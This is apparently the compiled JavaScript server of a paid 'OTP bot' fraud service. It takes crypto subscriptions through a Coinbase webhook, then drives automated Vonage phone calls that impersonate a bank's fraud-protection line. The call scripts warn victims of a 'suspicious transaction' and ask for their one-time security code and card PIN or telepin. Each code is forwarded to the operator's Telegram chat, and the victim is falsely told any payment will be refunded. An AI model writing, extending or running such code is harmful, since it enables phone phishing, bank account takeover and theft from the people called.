"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.server = void 0;
const coinbase_commerce_node_1 = require("coinbase-commerce-node");
const express_1 = __importDefault(require("express"));
const moment_1 = __importDefault(require("moment"));
const telegraf_1 = require("telegraf");
const contentful_1 = require("./utils/contentful");
const app = express_1.default();
app.use(express_1.default.json());
const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    app.post('/coinbase-webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        var _a, _b;
        const body = req.body;
        const signature = req.headers['x-cc-webhook-signature'];
        const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET;
        try {
            const event = coinbase_commerce_node_1.Webhook.verifyEventBody(JSON.stringify(body), signature, webhookSecret);
            const { metadata } = body.event.data;
            if (event.type === 'charge:pending' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, '😁 Your payment has been received but not confirmed yet ');
            }
            if (event.type === 'charge:confirmed' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, '😋 Your payment has been received');
                try {
                    const space = yield contentful_1.client.getSpace(process.env.CONTENTFUL_SPACE);
                    const env = yield space.getEnvironment('master');
                    const newUser = yield env.createEntry('user', {
                        fields: {
                            id: { 'en-US': Date.now() },
                            telegramId: { 'en-US': (_a = ctx.from) === null || _a === void 0 ? void 0 : _a.id },
                            username: { 'en-US': (_b = ctx.from) === null || _b === void 0 ? void 0 : _b.username },
                            membershipExpiry: {
                                'en-US': moment_1.default
                                    .utc()
                                    .add(1, 'month')
                                    .format(),
                            },
                            membershipType: 'SILVER',
                        },
                    });
                    ctx.telegram.sendMessage(metadata.chatId, '🤩 Your subsciption has been confirmed, to start send "call"');
                    console.log(newUser);
                }
                catch (error) {
                    console.log(error);
                }
            }
            if (event.type === 'charge:failed' &&
                metadata.reason === 'OTP Purchase') {
                ctx.telegram.sendMessage(metadata.chatIid, "😔 You didn't make a payment if this an error please contact admin");
            }
            return res.send(`success ${event.id}`);
        }
        catch (error) {
            return res.status(400).send('failure!');
        }
    }));
    app.post('/vonage-webhook/dtmf/:language', (req, res) => {
        var _a;
        const { dtmf } = req.body;
        if ((dtmf && dtmf.digits === '1') || (dtmf && dtmf.digits === '2')) {
            res.send([
                {
                    action: 'talk',
                    text: 'For your security please enter the security code we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${(_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id}/${req.params.language}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        submitOnHash: true,
                        timeOut: 10,
                        maxDigits: 18,
                    },
                },
            ]);
        }
        else if (dtmf && dtmf.digits === '3') {
            res.send([
                {
                    action: 'talk',
                    text: 'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${req.params.language}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        maxDigits: 1,
                        timeOut: 10,
                    },
                },
            ]);
        }
        else {
            res.send([
                {
                    action: 'talk',
                    text: 'You have selected an invalid option.',
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
                {
                    action: 'talk',
                    text: 'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${req.params.language}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        timeOut: 10,
                        maxDigits: 1,
                    },
                },
            ]);
        }
    });
    app.post('/vonage-webhook/pin/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        const { dtmf } = req.body;
        if (dtmf && dtmf.digits === '*') {
            return res.send([
                {
                    action: 'talk',
                    text: `Okay, you might receive another automated call if we detect a security code has been sent to you.`,
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
            ]);
        }
        if (dtmf && dtmf.digits) {
            yield ctx.telegram.sendMessage(req.params.chatId, req.params.language === 'en-US'
                ? `Card Pin is <b>${dtmf.digits}</b> 💳`
                : `Telepin is <b>${dtmf.digits}</b> 📟`, {
                parse_mode: 'HTML',
            });
        }
        res.send([
            {
                action: 'talk',
                text: `Great, you have entered ${dtmf.digits}.`,
                language: req.params.language,
                style: 2,
                bargeIn: true,
            },
            {
                action: 'talk',
                text: `Your account is now secure. If the payment has already left your account, no need to worry, it will automatically be refunded to you in 24 to 48 hours, thank you goodbye.`,
                language: req.params.language,
                style: 2,
                bargeIn: true,
            },
        ]);
    }));
    app.post('/vonage-webhook/otp/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        var _c;
        const { dtmf } = req.body;
        if (dtmf && dtmf.digits === '*') {
            res.send([
                {
                    action: 'talk',
                    text: `Okay, you might receive another automated call if we detect a security code has been sent to you.`,
                    language: req.params.language,
                    style: 2,
                    bargeIn: true,
                },
            ]);
            return ctx.telegram.sendMessage(req.params.chatId, `OTP not received ❌`, {
                parse_mode: 'HTML',
            });
        }
        if (dtmf && dtmf.digits) {
            yield ctx.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf.digits}</b> ✅`, {
                parse_mode: 'HTML',
            });
        }
        res.send([
            {
                action: 'talk',
                text: `Great, you have entered ${dtmf.digits}.`,
                language: req.params.language,
                style: 2,
                bargeIn: true,
            },
            {
                action: 'talk',
                text: req.params.language === 'en-US'
                    ? 'To authenticate you please enter your card pin followed by the # key'
                    : 'To authenticate you please enter your telepin followed by the # key',
                language: req.params.language,
                style: 2,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${(_c = ctx.chat) === null || _c === void 0 ? void 0 : _c.id}/${req.params.language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }));
    app.post('/vonage-webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
        var _d, _e, _f, _g, _h, _j, _k;
        const { status, to } = req.body;
        if (status === 'started') {
            yield ctx.telegram.sendMessage((_d = ctx.chat) === null || _d === void 0 ? void 0 : _d.id, `Calling (${to}) 📞`);
        }
        if (status === 'ringing') {
            yield ctx.telegram.sendMessage((_e = ctx.chat) === null || _e === void 0 ? void 0 : _e.id, `Ringing (${to}) 🔔`);
        }
        if (status === 'answered') {
            yield ctx.telegram.sendMessage((_f = ctx.chat) === null || _f === void 0 ? void 0 : _f.id, `On call (${to}) 🤳🏽`, {
                parse_mode: 'HTML',
            });
        }
        if (status === 'busy') {
            yield ctx.telegram.sendMessage((_g = ctx.chat) === null || _g === void 0 ? void 0 : _g.id, '<b>On another call </b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                    telegraf_1.Markup.button.callback('No', 'no'),
                ]).reply_markup,
            });
        }
        if (status === 'machine') {
            yield ctx.telegram.sendMessage((_h = ctx.chat) === null || _h === void 0 ? void 0 : _h.id, '<b>Voicemail</b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                    telegraf_1.Markup.button.callback('No', 'no'),
                ]).reply_markup,
            });
        }
        if (status === 'unanswered') {
            yield ctx.telegram.sendMessage((_j = ctx.chat) === null || _j === void 0 ? void 0 : _j.id, '<b>Hungup</b> ❌\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                    telegraf_1.Markup.button.callback('No', 'no'),
                ]).reply_markup,
            });
        }
        if (status === 'completed') {
            yield ctx.telegram.sendMessage((_k = ctx.chat) === null || _k === void 0 ? void 0 : _k.id, '<b>Ended</b>.\n\nCall again', {
                parse_mode: 'HTML',
                reply_markup: telegraf_1.Markup.inlineKeyboard([
                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yes'),
                    telegraf_1.Markup.button.callback('👎🏽 No', 'no'),
                ]).reply_markup,
            });
        }
        console.log('body: ', req.body);
        res.send({});
    }));
});
exports.server = server;
const port = process.env.PORT || 4000;
app.listen(port, () => console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`));
